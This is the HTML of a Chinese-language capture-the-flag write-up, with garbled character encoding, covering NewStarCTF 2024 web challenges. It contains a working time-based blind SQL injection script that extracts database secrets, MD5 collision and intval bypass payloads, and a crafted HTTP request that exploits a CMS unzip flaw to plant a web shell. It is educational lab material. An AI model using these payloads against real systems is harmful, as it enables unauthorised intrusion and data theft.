<p><img src="/p/newstarctf2024/image-20250706162529007.png"
	width="1808"
	height="710"
	srcset="/p/newstarctf2024/image-20250706162529007_hu14856798399545012720.png 480w, /p/newstarctf2024/image-20250706162529007_hu10060702041549581697.png 1024w"
	loading="lazy"
	
		alt="image-20250706162529007"
	
	
		class="gallery-image" 
		data-flex-grow="254"
		data-flex-basis="611px"
	
></p>
<p>PSï¼šå›¾ç‰‡é‡Œé¢çš„JWTå¯èƒ½æœ‰å‡ºå…¥ï¼Œå› ä¸ºå°è¯•äº†å¾ˆå¤šæ¬¡</p>
<p><img src="/p/newstarctf2024/image-20250706154019945.png"
	width="2094"
	height="835"
	srcset="/p/newstarctf2024/image-20250706154019945_hu17518761574483070080.png 480w, /p/newstarctf2024/image-20250706154019945_hu6367287026396061465.png 1024w"
	loading="lazy"
	
		alt="image-20250706154019945"
	
	
		class="gallery-image" 
		data-flex-grow="250"
		data-flex-basis="601px"
	
></p>
<p><img src="/p/newstarctf2024/image-20250706153859430.png"
	width="2292"
	height="931"
	srcset="/p/newstarctf2024/image-20250706153859430_hu4479862158868177941.png 480w, /p/newstarctf2024/image-20250706153859430_hu6422549245403304171.png 1024w"
	loading="lazy"
	
		alt="image-20250706153859430"
	
	
		class="gallery-image" 
		data-flex-grow="246"
		data-flex-basis="590px"
	
></p>
<p><img src="/p/newstarctf2024/image-20250706162422238.png"
	width="986"
	height="421"
	srcset="/p/newstarctf2024/image-20250706162422238_hu15007119164241927383.png 480w, /p/newstarctf2024/image-20250706162422238_hu18428484296462237041.png 1024w"
	loading="lazy"
	
		alt="image-20250706162422238"
	
	
		class="gallery-image" 
		data-flex-grow="234"
		data-flex-basis="562px"
	
></p>
<p>å¥½é¢˜å¤šå“ï¼Œè¶Šéš¾çš„é¢˜ç›®å¯¹äºä»£ç å®¡è®¡çš„è¦æ±‚å°±æ›´é«˜ï¼Œè¿™é‡Œä¹Ÿæœ‰å¾ˆå¤šå…³é”®ç‚¹æ˜¯éœ€è¦ä»£ç å®¡è®¡è¿‡å…³çš„ã€‚</p>
<h3 id="blindsql2">blindsql2
</h3><h4 id="çŸ¥è¯†ç‚¹æ—¶é—´ç›²æ³¨">çŸ¥è¯†ç‚¹ï¼šæ—¶é—´ç›²æ³¨
</h4><p>æœ€è®¨åŒç›²æ³¨ï¼Œé™¤äº†å†™è„šæœ¬å°±æ˜¯å†™è„šæœ¬ï¼Œè¿™é‡Œé¢˜ç›®ç›´æ¥ä¸ç»™å›æ˜¾äº†ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨sleep()ä½¿æœåŠ¡å™¨å›åº”å˜æ…¢ï¼Œä»¥æ­¤ä½œä¸ºåˆ¤æ–­asciiç æˆ–è€…æ˜¯è¡¨è¾¾å¼æ˜¯å¦æ­£ç¡®</p>
<p>è¿‡æ»¤ç©ºæ ¼ï¼Œ/ï¼Œç­‰å·ï¼Œsubstr,ascii</p>
<p>ç›´æ¥è´´expäº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://192.168.183.1:55251/&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#payload = f&#39;select%09database()&#39;    #æŸ¥ä¸€ä¸‹é»˜è®¤æ•°æ®åº“</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">#payload = f&#39;select%09group_concat(schema_name)%09from%09information_schema.schemata&#39;#æŸ¥æ‰€æœ‰æ•°æ®åº“</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">#payload = f&#39;select%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema%09like%09&#34;ctf&#34;&#39;		</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">#payload = f&#39;select%09group_concat(column_name)%09from%09information_schema.columns%09where%09table_name%09like%09&#34;secrets&#34;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;select%09group_concat(id,secret_key,secret_value)%09from%09ctf.secrets&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">payload_1</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;?student_name=1&#39;%09or%09if((Ord(mid((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">),sleep(3),0)%23&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload_1</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è„šæœ¬è·‘ä¸å‡ºã€‚æ¯è·‘ä¸€æ¬¡éƒ½æ˜¯ä¸€ä¸ªæ–°çš„ç­”æ¡ˆã€‚</p>
<p>è¿™é‡Œç›´æ¥è·³äº†</p>
<h3 id="chocolate">chocolate
</h3><h4 id="çŸ¥è¯†ç‚¹intvalmd5ç»•è¿‡ç®€å•ååºåˆ—åŒ–">çŸ¥è¯†ç‚¹ï¼šintvalã€MD5ç»•è¿‡ã€ç®€å•ååºåˆ—åŒ–
</h4><p><img src="/p/newstarctf2024/image-20250706170918673.png"
	width="1477"
	height="495"
	srcset="/p/newstarctf2024/image-20250706170918673_hu9918067848852340955.png 480w, /p/newstarctf2024/image-20250706170918673_hu10687051325074103991.png 1024w"
	loading="lazy"
	
		alt="image-20250706170918673"
	
	
		class="gallery-image" 
		data-flex-grow="298"
		data-flex-basis="716px"
	
></p>
<p><img src="/p/newstarctf2024/image-20250706171014425.png"
	width="522"
	height="705"
	srcset="/p/newstarctf2024/image-20250706171014425_hu16407391130230560598.png 480w, /p/newstarctf2024/image-20250706171014425_hu13125717810657497171.png 1024w"
	loading="lazy"
	
		alt="image-20250706171014425"
	
	
		class="gallery-image" 
		data-flex-grow="74"
		data-flex-basis="177px"
	
></p>
<p>å…³äºintvalå‡½æ•°çš„ç»•è¿‡</p>
<p>éœ€è¦numä¸èƒ½ç­‰äºå­—ç¬¦ä¸²1337ï¼Œä¸èƒ½åŒ…å«å­—æ¯æˆ–è€…<code>.</code>ï¼Œå¿…é¡»åŒ…å«0ï¼Œ<code>intval($num,0)</code> å¿…é¡»ç­‰äº <code>1337</code>ã€‚</p>
<p>è¿™ä¸ªå‡½æ•°æœ‰ä¸ªç‰¹æ€§ï¼Œå¼€å¤´ä¸º0çš„æ•°å­—ä¼šè¢«è§£ææˆå…«è¿›åˆ¶æ•°</p>
<p>ä¼ å…¥num=02471</p>
<p><img src="/p/newstarctf2024/image-20250706171921290.png"
	width="1711"
	height="329"
	srcset="/p/newstarctf2024/image-20250706171921290_hu11074326082180138358.png 480w, /p/newstarctf2024/image-20250706171921290_hu1917131617811567351.png 1024w"
	loading="lazy"
	
		alt="image-20250706171921290"
	
	
		class="gallery-image" 
		data-flex-grow="520"
		data-flex-basis="1248px"
	
></p>
<p>è·å¾—<code>å¯å¯æ¶²å— (g): 1337033</code>å’Œ<code>gur arkg yriry vf : pbpbnOhggre_fgne.cuc</code>ï¼Œå› ä¸º<code>.cuc</code>å’Œå®¹æ˜“è”æƒ³åˆ°<code>.php</code>ï¼Œæ‰€ä»¥å°è¯•ä¸€ä¸‹å‡¯æ’’</p>
<p><img src="/p/newstarctf2024/image-20250706172243504.png"
	width="1137"
	height="688"
	srcset="/p/newstarctf2024/image-20250706172243504_hu18151072603355026165.png 480w, /p/newstarctf2024/image-20250706172243504_hu8968867087534267376.png 1024w"
	loading="lazy"
	
		alt="image-20250706172243504"
	
	
		class="gallery-image" 
		data-flex-grow="165"
		data-flex-basis="396px"
	
></p>
<p>è·å¾—ä¸‹ä¸€å…³ï¼š<code>cocoaButter_star.php</code></p>
<p><img src="/p/newstarctf2024/image-20250706172412311.png"
	width="862"
	height="907"
	srcset="/p/newstarctf2024/image-20250706172412311_hu3371062715894307214.png 480w, /p/newstarctf2024/image-20250706172412311_hu6082274042282279165.png 1024w"
	loading="lazy"
	
		alt="image-20250706172412311"
	
	
		class="gallery-image" 
		data-flex-grow="95"
		data-flex-basis="228px"
	
></p>
<p>å…³äºmd5çš„ç»•è¿‡ã€è¿™é‡Œé¦–å…ˆæ˜¯md5ç¢°æ’ï¼Œå¯ä»¥ç”¨fastcollç”Ÿæˆã€ç„¶åæ˜¯è‡ªèº«è‹¥ç­‰äºè‡ªèº«çš„md5ï¼Œå¯ä»¥å†™è„šæœ¬çˆ†ç ´ï¼Œä¹Ÿå¯ä»¥ç½‘ä¸Šæ‰¾å¯ä»¥ä¼ <code>0e215962017</code>ã€æœ€åæ˜¯å‚æ•°çš„md5çš„å‰äº”ä¸ªæ•°å­—ç­‰äº<code>8031b</code>ï¼Œè¿™ä¸ªå¯ä»¥å†™è„šæœ¬çˆ†ç ´</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import hashlib
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">prefix = &#34;8031b&#34;
</span></span><span class="line"><span class="cl">i = 0
</span></span><span class="line"><span class="cl">while True:
</span></span><span class="line"><span class="cl">    s = str(i)
</span></span><span class="line"><span class="cl">    md5 = hashlib.md5(s.encode()).hexdigest()
</span></span><span class="line"><span class="cl">    if md5.startswith(prefix):
</span></span><span class="line"><span class="cl">        print(f&#34;Found: {s} -&gt; {md5}&#34;)
</span></span><span class="line"><span class="cl">        break
</span></span><span class="line"><span class="cl">    i += 1
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250706173329062.png"
	width="842"
	height="787"
	srcset="/p/newstarctf2024/image-20250706173329062_hu6376172117548353839.png 480w, /p/newstarctf2024/image-20250706173329062_hu2436827648501764246.png 1024w"
	loading="lazy"
	
		alt="image-20250706173329062"
	
	
		class="gallery-image" 
		data-flex-grow="106"
		data-flex-basis="256px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">dog=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">moew=0e215962017
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">next_level=2306312
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250706173457162.png"
	width="1232"
	height="907"
	srcset="/p/newstarctf2024/image-20250706173457162_hu17700547011968532770.png 480w, /p/newstarctf2024/image-20250706173457162_hu14043028591373437863.png 1024w"
	loading="lazy"
	
		alt="image-20250706173726564"
	
	
		class="gallery-image" 
		data-flex-grow="135"
		data-flex-basis="325px"
	
></p>
<p>å¾—åˆ°final.phpï¼Œè¿›å…¥åæ˜¯ä¸€ä¸ªååºåˆ—åŒ–</p>
<p><img src="/p/newstarctf2024/image-20250706173813016.png"
	width="805"
	height="1051"
	srcset="/p/newstarctf2024/image-20250706173813016_hu12030913818645795395.png 480w, /p/newstarctf2024/image-20250706173813016_hu2899407582404461119.png 1024w"
	loading="lazy"
	
		alt="image-20250706173813016"
	
	
		class="gallery-image" 
		data-flex-grow="76"
		data-flex-basis="183px"
	
></p>
<p>è¿™é‡Œæ²¡æœ‰ä¼ å‚ç‚¹ï¼Œä½†æ˜¯å› ä¸º<code>$food = file_get_contents('php://input');</code>æˆ‘ä»¬ç”¨poståœ¨http bodyéƒ¨åˆ†å¡«å…¥payloadå°±å¥½ã€‚</p>
<p>ç„¶åè¿™é‡Œæ²¡æœ‰popé“¾ï¼Œç›´æ¥ä¼ å…¥å°±è¡Œï¼Œæ²¡æœ‰åˆ«çš„å•¥ä¸œè¥¿</p>
<p><img src="/p/newstarctf2024/image-20250706174823744.png"
	width="1787"
	height="900"
	srcset="/p/newstarctf2024/image-20250706174823744_hu10794686849995201107.png 480w, /p/newstarctf2024/image-20250706174823744_hu15923466920254871449.png 1024w"
	loading="lazy"
	
		alt="image-20250706174823744"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="476px"
	
></p>
<p>æœ€åè¿˜å·®ä¸€ä¸ªç³–åˆ†ï¼Œæˆ‘ä»¬è¾“å…¥å°‘çš„æ—¶å€™ä¼šè¯´è‹¦äº†ï¼Œè¾“å…¥å¤šçš„æ—¶å€™ä¼šè¯´ç”œäº†ã€‚ä¹Ÿæ˜¯ä¸ªå¸ƒå°”ç›²æ³¨ã€‚</p>
<p>æœ€åä¹Ÿä¸ç”¨å†™è„šæœ¬äº†ï¼Œè‡ªå·±éšä¾¿è¯•è¯•å°±å‡ºæ¥äº†ï¼Œæ˜¯2042</p>
<p><img src="/p/newstarctf2024/image-20250706175111534.png"
	width="1280"
	height="144"
	srcset="/p/newstarctf2024/image-20250706175111534_hu10808262419883111122.png 480w, /p/newstarctf2024/image-20250706175111534_hu14582369073607818262.png 1024w"
	loading="lazy"
	
		alt="image-20250706175111534"
	
	
		class="gallery-image" 
		data-flex-grow="888"
		data-flex-basis="2133px"
	
></p>
<p>è¿™é¢˜æ¯”è¾ƒåŸºç¡€æŠŠï¼Œæ„Ÿè§‰æ²¡æœ‰å‰é¢çš„JWT+SSRFç»„åˆæ‹³å‰å®³</p>
<h3 id="ezcmsss">ezcmsss
</h3><h4 id="çŸ¥è¯†ç‚¹cveçš„å¯»æ‰¾">çŸ¥è¯†ç‚¹ï¼šCVEçš„å¯»æ‰¾
</h4><p>æ‰«å‡ºæ¥ä¸€ä¸ªamdin.phpæ˜¯ç™»å½•adminçš„</p>
<p><img src="/p/newstarctf2024/image-20250707115601740.png"
	width="1491"
	height="219"
	srcset="/p/newstarctf2024/image-20250707115601740_hu4070114020165730315.png 480w, /p/newstarctf2024/image-20250707115601740_hu9351530860880430850.png 1024w"
	loading="lazy"
	
		alt="image-20250707115601740"
	
	
		class="gallery-image" 
		data-flex-grow="680"
		data-flex-basis="1633px"
	
></p>
<p>é¡µé¢éœ€è¦éªŒè¯ç ï¼Œæ‰€ä»¥åº”è¯¥ä¸æ˜¯çˆ†ç ´</p>
<p><img src="/p/newstarctf2024/image-20250707115658562.png"
	width="960"
	height="824"
	srcset="/p/newstarctf2024/image-20250707115658562_hu3276538423067629784.png 480w, /p/newstarctf2024/image-20250707115658562_hu2140408318924808550.png 1024w"
	loading="lazy"
	
		alt="image-20250707115658562"
	
	
		class="gallery-image" 
		data-flex-grow="116"
		data-flex-basis="279px"
	
></p>
<p>è¿˜æœ‰è¿™ä¸ªwww.zip</p>
<p><img src="/p/newstarctf2024/image-20250707130216771.png"
	width="608"
	height="134"
	srcset="/p/newstarctf2024/image-20250707130216771_hu2248355069328938920.png 480w, /p/newstarctf2024/image-20250707130216771_hu8741960682681502607.png 1024w"
	loading="lazy"
	
		alt="image-20250707130216771"
	
	
		class="gallery-image" 
		data-flex-grow="453"
		data-flex-basis="1088px"
	
></p>
<p>ä¸‹è½½ååœ¨start.shæ‰¾åˆ°åˆå§‹çš„adminè´¦å·å’Œå¯†ç ï¼ˆç¬¬äºŒä¸ªcurlï¼‰</p>
<p><img src="/p/newstarctf2024/image-20250707133554537.png"
	width="1372"
	height="781"
	srcset="/p/newstarctf2024/image-20250707133554537_hu12086357365073595031.png 480w, /p/newstarctf2024/image-20250707133554537_hu7684557240627750085.png 1024w"
	loading="lazy"
	
		alt="image-20250707133554537"
	
	
		class="gallery-image" 
		data-flex-grow="175"
		data-flex-basis="421px"
	
></p>
<p>ç™»å½•æˆåŠŸ</p>
<p><img src="/p/newstarctf2024/image-20250707133748566.png"
	width="1812"
	height="771"
	srcset="/p/newstarctf2024/image-20250707133748566_hu15788006848927863420.png 480w, /p/newstarctf2024/image-20250707133748566_hu4410375340006564432.png 1024w"
	loading="lazy"
	
		alt="image-20250707133748566"
	
	
		class="gallery-image" 
		data-flex-grow="235"
		data-flex-basis="564px"
	
></p>
<p>ç„¶åå°±æ˜¯æ‰¾cveï¼Œåœ¨æºç çš„readme.txté‡Œæœ‰æ›´æ–°æ—¥å¿—ï¼Œå¯ä»¥çœ‹åˆ°ç‰ˆæœ¬æ˜¯v1.9.5</p>
<p>[<a class="link" href="https://blog.51cto.com/u_15847702/5803103"  target="_blank" rel="noopener"
    >ä»£ç å®¡è®¡]æè‡´CMS1.9.5å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´_wx6358e1fe5abe0çš„æŠ€æœ¯åšå®¢_51CTOåšå®¢</a></p>
<p>æ‰¾åˆ°äº†è¿™ä¸ªæ¼æ´ï¼Œä½†æ˜¯ä¸èƒ½æŒ‰ç…§è¿™ä¸ªæ•™ç¨‹ä¸€æ­¥æ­¥æ¥ï¼Œå› ä¸ºç¯å¢ƒæ˜¯ä¸å‡ºç½‘çš„ï¼Œä¸è¿‡æ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬éœ€è¦ä¸Šä¼ zipæ–‡ä»¶ï¼Œå†é€šè¿‡ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œæœ¬åœ°ä¸‹è½½è§£å‹</p>
<p>è¿™é‡Œä¸Šä¼ 1.zip</p>
<p><img src="/p/newstarctf2024/image-20250707135849142.png"
	width="1870"
	height="939"
	srcset="/p/newstarctf2024/image-20250707135849142_hu10268637553003081205.png 480w, /p/newstarctf2024/image-20250707135849142_hu15992597241149007898.png 1024w"
	loading="lazy"
	
		alt="image-20250707135849142"
	
	
		class="gallery-image" 
		data-flex-grow="199"
		data-flex-basis="477px"
	
></p>
<p>æŠ“åŒ…å‘ç°è·¯å¾„<code>/static/upload/file/20250707/1751868033849438.zip</code></p>
<p><img src="/p/newstarctf2024/image-20250707140606635.png"
	width="1068"
	height="626"
	srcset="/p/newstarctf2024/image-20250707140606635_hu987972712037191622.png 480w, /p/newstarctf2024/image-20250707140606635_hu3838887908729635136.png 1024w"
	loading="lazy"
	
		alt="image-20250707140606635"
	
	
		class="gallery-image" 
		data-flex-grow="170"
		data-flex-basis="409px"
	
></p>
<p>æ„é€ ï¼Œï¼ˆåœ¨æ’ä»¶åˆ—è¡¨æŠ“åŒ…ï¼Œç„¶åç…§ç€ç½‘ä¸Šçš„èµ°ï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">POST</span> <span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">php</span><span class="o">/</span><span class="n">Plugins</span><span class="o">/</span><span class="n">update</span><span class="o">.</span><span class="n">html</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">183.1</span><span class="p">:</span><span class="mi">56954</span>
</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">126</span>
</span></span><span class="line"><span class="cl"><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Windows</span> <span class="n">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="n">Win64</span><span class="p">;</span> <span class="n">x64</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mf">129.0</span><span class="o">.</span><span class="mf">0.0</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span> <span class="n">Edg</span><span class="o">/</span><span class="mf">129.0</span><span class="o">.</span><span class="mf">0.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">,</span> <span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">,</span> <span class="o">*/*</span><span class="p">;</span> <span class="n">q</span><span class="o">=</span><span class="mf">0.01</span>
</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">GB</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.6</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="p">:</span><span class="n">PHPSESSID</span><span class="o">=</span><span class="n">l76k1ofjvm86nbd7vpk54i3et0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">filepath</span><span class="o">=</span><span class="n">apidata</span><span class="o">&amp;</span><span class="n">action</span><span class="o">=</span><span class="n">file</span><span class="o">-</span><span class="n">upzip</span><span class="o">&amp;</span><span class="n">type</span><span class="o">=</span><span class="mi">0</span><span class="o">&amp;</span><span class="n">download_url</span><span class="o">=</span><span class="n">http</span><span class="o">%</span><span class="mi">3</span><span class="n">a</span><span class="o">//</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">/</span><span class="k">static</span><span class="o">/</span><span class="n">upload</span><span class="o">/</span><span class="n">file</span><span class="o">/</span><span class="mi">20250707</span><span class="o">/</span><span class="mf">1751868033849438.</span><span class="n">zip</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="D:%5cblog%5chugo_extended_0.133.1_windows-amd64%5cdev%5ccontent%5cpost%5cNewstarCTF2024%e5%a4%8d%e7%8e%b0%5cimage-20250707140959515.png"
	
	
	
	loading="lazy"
	
		alt="image-20250707141246136"
	
	
></p>
<p>æ”¹ä¸€ä¸‹actionï¼Œè§£å‹</p>
<p><img src="/p/newstarctf2024/image-20250707141629673.png"
	width="1986"
	height="774"
	srcset="/p/newstarctf2024/image-20250707141629673_hu11315877022311962428.png 480w, /p/newstarctf2024/image-20250707141629673_hu12341309140432755347.png 1024w"
	loading="lazy"
	
		alt="image-20250707141629673"
	
	
		class="gallery-image" 
		data-flex-grow="256"
		data-flex-basis="615px"
	
></p>
<p>æœ€åä¹Ÿæ˜¯æˆåŠŸä¸Šä¼ äº†ï¼Œä¹Ÿèƒ½æ‰“å¼€ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ— æ³•å‘½ä»¤æ‰§è¡Œã€‚</p>
<p>åæ¥æ€€ç–‘æ˜¯å› ä¸ºæˆ‘çš„é©¬æ˜¯äº‹å…ˆç”¨çŸ­æ ‡ç­¾ç»•è¿‡çš„ï¼Œæ‰€ä»¥é‡æ–°ä¼ äº†ä¸€ä¸ªï¼Œç„¶åæˆåŠŸäº†</p>
<p><img src="/p/newstarctf2024/image-20250707143359536.png"
	width="1170"
	height="943"
	srcset="/p/newstarctf2024/image-20250707143359536_hu13407698127101005371.png 480w, /p/newstarctf2024/image-20250707143359536_hu7689239497819562911.png 1024w"
	loading="lazy"
	
		alt="image-20250707143359536"
	
	
		class="gallery-image" 
		data-flex-grow="124"
		data-flex-basis="297px"
	
></p>
<p>æ„Ÿè§‰å’Œæ ¡èµ›å‡ºçš„é‚£é“å·®ä¸å¤š</p>
<h3 id="ezpollute">ezpollute
